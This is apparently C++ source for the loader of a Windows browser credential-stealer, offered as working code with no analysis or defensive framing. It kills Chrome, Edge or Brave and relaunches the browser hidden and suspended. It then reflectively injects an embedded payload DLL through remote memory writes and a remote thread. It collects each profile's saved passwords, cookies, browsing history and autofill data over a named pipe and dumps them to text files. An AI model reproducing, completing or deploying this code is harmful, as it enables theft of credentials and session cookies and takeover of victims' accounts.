#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include "bootstrapper.h"
#include "../../proxydll/src/json.hpp"

using json = nlohmann::json;
namespace fs = std::filesystem;

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---
const std::string EMBEDDED_DLL_BASE64 = "";

struct BrowserConfig {
    std::string name;
    std::string exe_name;
    std::vector<std::string> common_paths;
};

const std::vector<BrowserConfig> BROWSERS = {
    {"Chrome", "chrome.exe", {
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
    }},
    {"Edge", "msedge.exe", {
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
    }},
    {"Brave", "brave.exe", {
        "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
        "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
    }}
};

std::string base64_decode(const std::string& in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

std::string find_browser_exe(const std::string& name) {
    for (const auto& config : BROWSERS) {
        if (stricmp(config.name.c_str(), name.c_str()) == 0) {
            for (const auto& path : config.common_paths) {
                if (fs::exists(path)) return path;
            }
        }
    }
    return "";
}

void kill_processes_by_name(const std::string& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring ws(entry.szExeFile);
            std::string current_exe(ws.begin(), ws.end());
            if (stricmp(current_exe.c_str(), exe_name.c_str()) == 0) {
                HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (h_process) {
                    TerminateProcess(h_process, 0);
                    CloseHandle(h_process);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

void inject_dll_reflective(HANDLE h_process, const std::string& dll_bytes) {
    const BYTE* dll_ptr = (const BYTE*)dll_bytes.data();
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_ptr;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Invalid DOS signature" << std::endl;
        return;
    }

    PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)(dll_ptr + dos_header->e_lfanew);
    if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Not a 64-bit DLL" << std::endl;
        return;
    }

    DWORD image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;

    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) {
        std::cerr << "Failed to allocate memory in target process" << std::endl;
        return;
    }

    WriteProcessMemory(h_process, remote_base, dll_ptr, nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++) {
        if (section->PointerToRawData == 0 || section->SizeOfRawData == 0) continue;
        void* remote_section_addr = (void*)((ULONG_PTR)remote_base + section->VirtualAddress);
        void* local_section_addr = (void*)(dll_ptr + section->PointerToRawData);
        WriteProcessMemory(h_process, remote_section_addr, local_section_addr, section->SizeOfRawData, NULL);
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {0};
    dll_info.base = remote_base;
    dll_info.load_library_a = (HINSTANCE (WINAPI *)(const char*))GetProcAddress(h_kernel32, "LoadLibraryA");
    dll_info.get_proc_address = (void* (WINAPI *)(HINSTANCE, const char*))GetProcAddress(h_kernel32, "GetProcAddress");
    dll_info.relocation_required = relocation_required;

    size_t bootstrapper_size = (ULONG_PTR)realign_pe_end - (ULONG_PTR)realign_pe;
    if (bootstrapper_size == 0) bootstrapper_size = 4096;

    size_t total_bootstrap_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap_mem = VirtualAllocEx(h_process, NULL, total_bootstrap_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap_mem, &dll_info, sizeof(DllInfo), NULL);
    void* remote_code_addr = (void*)((ULONG_PTR)remote_bootstrap_mem + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code_addr, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code_addr, remote_bootstrap_mem, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::string& dll_bytes, const BrowserConfig& config) {
    std::cout << "\n--- Processing Browser: " << config.name << " ---" << std::endl;

    kill_processes_by_name(config.exe_name);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    std::wstring cmd = std::wstring(config.exe_name.begin(), config.exe_name.end()) + L" --headless --disable-gpu";
    BOOL success = CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!success) {
        std::string path = find_browser_exe(config.name);
        if (!path.empty()) {
            std::wstring wpath = std::wstring(path.begin(), path.end());
            cmd = L"\"" + wpath + L"\" --headless --disable-gpu";
            success = CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        }
    }

    if (!success) {
        std::cerr << "Failed to create " << config.exe_name << " process" << std::endl;
        return;
    }

    inject_dll_reflective(pi.hProcess, dll_bytes);
    ResumeThread(pi.hThread);

    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);

    if (h_pipe != INVALID_HANDLE_VALUE) {
        std::cout << "Waiting for DLL connection..." << std::endl;
        if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            std::vector<char> buffer;
            char temp_buffer[8192];
            DWORD bytes_read;
            while (ReadFile(h_pipe, temp_buffer, sizeof(temp_buffer), &bytes_read, NULL) && bytes_read > 0) {
                buffer.insert(buffer.end(), temp_buffer, temp_buffer + bytes_read);
            }

            if (!buffer.empty()) {
                try {
                    auto profiles = json::parse(buffer.begin(), buffer.end());
                    fs::path browser_dir(config.name);
                    fs::create_directories(browser_dir);

                    int i = 1;
                    for (auto& profile : profiles) {
                        fs::path profile_dir = browser_dir / ("profile " + std::to_string(i++));
                        fs::create_directories(profile_dir);

                        std::ofstream pf(profile_dir / "password.txt");
                        for (auto& p : profile["passwords"]) pf << "URL: " << p["url"] << "\nUser: " << p["username"] << "\nPass: " << p["password"] << "\n\n";

                        std::ofstream cf(profile_dir / "cookie.txt");
                        for (auto& c : profile["cookies"]) cf << "Host: " << c["host"] << " | Name: " << c["name"] << " | Value: " << c["value"] << "\n";

                        std::ofstream hf(profile_dir / "history.txt");
                        for (auto& h : profile["history"]) hf << "URL: " << h["url"] << " | Title: " << h["title"] << " | Visits: " << h["visit_count"] << "\n";

                        std::ofstream af(profile_dir / "autofill.txt");
                        for (auto& a : profile["autofill"]) af << "Name: " << a["name"] << " | Value: " << a["value"] << "\n";

                        std::cout << "Saved " << config.name << " profile: " << profile["name"] << std::endl;
                    }
                } catch (std::exception& e) {
                    std::cerr << "JSON parse error: " << e.what() << std::endl;
                }
            }
        }
        CloseHandle(h_pipe);
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(int argc, char* argv[]) {
    std::string target_browser = "all";
    if (argc > 1) {
        for (int i = 1; i < argc; i++) {
            if ((strcmp(argv[i], "-b") == 0 || strcmp(argv[i], "--browser") == 0) && i + 1 < argc) {
                target_browser = argv[i+1];
                break;
            }
        }
    }

    std::cout << "[*] Decoding embedded DLL..." << std::endl;
    std::string dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
    if (dll_bytes.empty()) {
        // Fallback for testing: read from file if base64 is empty
        if (fs::exists("payload.dll")) {
            std::ifstream f("payload.dll", std::ios::binary);
            dll_bytes.assign((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        }
    }

    if (dll_bytes.empty()) {
        std::cerr << "No DLL data found!" << std::endl;
        return 1;
    }

    if (stricmp(target_browser.c_str(), "all") == 0) {
        for (const auto& config : BROWSERS) inject_and_collect(dll_bytes, config);
    } else {
        bool found = false;
        for (const auto& config : BROWSERS) {
            if (stricmp(config.name.c_str(), target_browser.c_str()) == 0) {
                inject_and_collect(dll_bytes, config);
                found = true;
                break;
            }
        }
        if (!found) std::cerr << "Unsupported browser: " << target_browser << std::endl;
    }

    return 0;
}
